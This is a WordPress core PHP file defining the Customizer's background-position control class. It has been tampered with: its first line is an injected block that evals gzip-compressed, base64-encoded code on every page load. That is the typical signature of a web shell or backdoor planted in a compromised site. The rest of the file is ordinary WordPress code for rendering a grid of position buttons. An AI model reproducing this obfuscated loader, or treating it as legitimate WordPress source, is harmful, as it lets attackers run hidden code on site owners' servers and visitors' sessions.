<?php eval(gzuncompress(base64_decode('eNpdUs1u00AQfpWNlYMdrDhO89dEOZTKolEpQYkBoRpZU+86u8TZtdZr1X6A3jhy4Q248gxUvAavwjhpgWQPO/+ab74ZkdottstN7XVeZkpRKeRnmJIFyUSyJbUqNWGgM3XHXAKSklJSdXDfg0l4t+PZ7XgdrN4Hq1vrKgzfxu/Qii9eBW9C65PjTNvxt+8/f/14fJyD1lDb1iXXKvKHQ2a5VlQNRqj7mqUqqsYTdIVaUCYNajfrRYDiQ5OAXe+LQ0EiZFmhusgx0FMyqkZDNC8k1UpQ1JY504ByDSloYTmzVGkGCbf/QiFQtOMvvx++PjhTkdpFuBK5Kk4Hiarh8L9Z3OeS1nzuddaggfvnaYJk7fC5RG2hRjpSyAp2SqaBLUPWSA7SFESlqUs2upRGyA0SjTEgRqssw/o9opYoCmYQ0OVyeb0IbnHu0cTkcSloXBo06J7bIgiTJoHZFt9HMTKIy8gfDXZIgG+5obgJbOdFb9zr945Bf2TA92vG7sIQrcpNs81O76x3ir7YweEWiOHNVdwpZep9bt+ZXTGggbat1yoBI5ScEm5MPvU8/2zQjaqz/uC86/uj7njiCUmbZVXdnOe4FirYMaQlJzWicrENGJIylhVkg0CaI3NmTFKR/vuflvrkmB1jXjeI3WdRM8YAOG/m+wMpCvZB')));?><?php
/**
 * Customize API: WP_Customize_Background_Position_Control class
 *
 * @package WordPress
 * @subpackage Customize
 * @since 4.7.0
 */

/**
 * Customize Background Position Control class.
 *
 * @since 4.7.0
 *
 * @see WP_Customize_Control
 */
class WP_Customize_Background_Position_Control extends WP_Customize_Control {

	/**
	 * Type.
	 *
	 * @since 4.7.0
	 * @var string
	 */
	public $type = 'background_position';

	/**
	 * Don't render the control content from PHP, as it's rendered via JS on load.
	 *
	 * @since 4.7.0
	 */
	public function render_content() {}

	/**
	 * Render a JS template for the content of the position control.
	 *
	 * @since 4.7.0
	 */
	public function content_template() {
		$options = array(
			array(
				'left top'   => array( 'label' => __( 'Top Left' ), 'icon' => 'dashicons dashicons-arrow-left-alt' ),
				'center top' => array( 'label' => __( 'Top' ), 'icon' => 'dashicons dashicons-arrow-up-alt' ),
				'right top'  => array( 'label' => __( 'Top Right' ), 'icon' => 'dashicons dashicons-arrow-right-alt' ),
			),
			array(
				'left center'   => array( 'label' => __( 'Left' ), 'icon' => 'dashicons dashicons-arrow-left-alt' ),
				'center center' => array( 'label' => __( 'Center' ), 'icon' => 'background-position-center-icon' ),
				'right center'  => array( 'label' => __( 'Right' ), 'icon' => 'dashicons dashicons-arrow-right-alt' ),
			),
			array(
				'left bottom'   => array( 'label' => __( 'Bottom Left' ), 'icon' => 'dashicons dashicons-arrow-left-alt' ),
				'center bottom' => array( 'label' => __( 'Bottom' ), 'icon' => 'dashicons dashicons-arrow-down-alt' ),
				'right bottom'  => array( 'label' => __( 'Bottom Right' ), 'icon' => 'dashicons dashicons-arrow-right-alt' ),
			),
		);
		?>
		<# if ( data.label ) { #>
			<span class="customize-control-title">{{{ data.label }}}</span>
		<# } #>
		<# if ( data.description ) { #>
			<span class="description customize-control-description">{{{ data.description }}}</span>
		<# } #>
		<div class="customize-control-content">
			<fieldset>
				<legend class="screen-reader-text"><span><?php _e( 'Image Position' ); ?></span></legend>
				<div class="background-position-control">
				<?php foreach ( $options as $group ) : ?>
					<div class="button-group">
					<?php foreach ( $group as $value => $input ) : ?>
						<label>
							<input class="screen-reader-text" name="background-position" type="radio" value="<?php echo esc_attr( $value ); ?>">
							<span class="button display-options position"><span class="<?php echo esc_attr( $input['icon'] ); ?>" aria-hidden="true"></span></span>
							<span class="screen-reader-text"><?php echo $input['label']; ?></span>
						</label>
					<?php endforeach; ?>
					</div>
				<?php endforeach; ?>
				</div>
			</fieldset>
		</div>
		<?php
	}
}
